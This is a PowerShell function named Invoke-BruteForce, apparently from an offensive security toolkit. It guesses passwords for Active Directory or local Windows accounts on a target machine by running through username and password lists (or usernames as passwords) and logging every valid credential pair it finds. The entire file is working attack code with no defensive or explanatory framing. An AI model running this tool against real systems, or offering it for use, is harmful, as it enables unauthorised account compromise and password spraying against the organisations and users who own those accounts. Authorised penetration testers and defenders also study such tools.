﻿
function Invoke-BruteForce
{

    [CmdletBinding()] Param(
        [Parameter(Mandatory = $true, Position = 0, ValueFromPipeline=$true)]
        [Alias("MachineName","IP","IPAddress")]
        [String]
        $ComputerName,

        [Parameter(Position = 1, Mandatory = $true)]
        [Alias('Users')]
        [String]
        $UserList,

        [Parameter(Position = 2, Mandatory = $false)]
        [Alias('Passwords')]
        [String]
        $PasswordList,

        [Parameter(Position = 3, Mandatory = $true)] [ValidateSet("ActiveDirectory","LocalAccounts")]
        [String]
        $Service = "ActiveDirectory",

        [Parameter(Position = 4, Mandatory = $false)] [ValidateSet($true, $false)]
        [String]
        $UserAsPass = $false,

        [Parameter(Position = 5, Mandatory = $false)] [ValidateSet($true, $false)]
        [String]
        $LogFile = "out.txt"
    )

    Process
    {
        Write-Verbose "Starting Brute-Force"
        
        $usernames = Get-Content -ErrorAction SilentlyContinue -Path $UserList

        $isPasswordSet = $false
        
        if ($PasswordList)
        {
            $passwords = Get-Content -ErrorAction SilentlyContinue -Path $PasswordList
            $isPasswordSet = $true
        }

        if (!$usernames)
        { 
            $usernames = $UserList
            Write-Verbose "UserList file does not exist. Using UserList as usernames:"
            Write-Verbose $usernames
        }
        
        if (!$passwords -and $isPasswordSet -eq $true)
        {
            $passwords = $PasswordList
            Write-Verbose "PasswordList file does not exist. Using PasswordList as passwords:"
            Write-Verbose $passwords
        }

        if ($service -eq "ActiveDirectory" -or $service -eq "LocalAccounts")
        {
            Add-Type -AssemblyName System.DirectoryServices.AccountManagement
            
	        if ($service -eq "ActiveDirectory")
	        {
	            Write-Output "Brute Forcing Active Directory $ComputerName"
                    $contextType = [System.DirectoryServices.AccountManagement.ContextType]::Domain
	        }
	        else
	        {
	            Write-Output "Brute Forcing Local Accounts $ComputerName"
                    $contextType = [System.DirectoryServices.AccountManagement.ContextType]::Machine
	        }
                   
            Try
            {
                $principalContext = New-Object System.DirectoryServices.AccountManagement.PrincipalContext($contextType, $ComputerName)
                $success = $true
            }
            Catch
            {
                $message = "Unable to contact Domain"
                $success = $false
            }

                if ($success -ne $false)
                {
                    if ($UserAsPass -eq $true)
                    {
                        :UsernameLoop foreach ($username in $usernames)
                        {
                            Try
                            {
                                
                                
                                Write-Verbose "Checking username $username and password $username..."
                                
                                $success = $principalContext.ValidateCredentials($username, $username)
                                $message = "Password Match"

                                if ($success -eq $true)
                                {
                                    $tmp = $host.ui.RawUI.ForegroundColor
                                    $host.ui.RawUI.ForegroundColor = “Green”
                                    Write-Output "[+] $username : $username"
                                    Add-Content -Path $LogFile -Value "$username $username"
                                    $host.ui.RawUI.ForegroundColor = $tmp
                                }
                            }
                            Catch
                            {
                                $success = $false
                                $message = "Password doesn't match"
                            }
                         }
                     }
                     
                    if ($isPasswordSet -eq $true)
                    { 
                        :UsernameLoop foreach ($username in $usernames)
                        {
                        
                            foreach ($password in $passwords)
                            {

                                Try
                                {
                                    
                                    Write-Verbose "Checking username $username and password $password..."
                                  
                                    $success = $principalContext.ValidateCredentials($username, $password)
                                    $message = "Password Match"

                                    if ($success -eq $true)
                                    {
                                        $tmp = $host.ui.RawUI.ForegroundColor
                                        $host.ui.RawUI.ForegroundColor = “Green”
                                        Write-Output "[+] $username : $password"
                                        Add-Content -Path $LogFile -Value "$username $password"
                                        $host.ui.RawUI.ForegroundColor = $tmp
                                    }
                                }
                                Catch
                                {
                                    $success = $false
                                    $message = "Password doesn't match"
                                }

                            }
                        }
                    }
                    
                }
                else
                {
                    Write $message    
                }
        }
       
    }
}

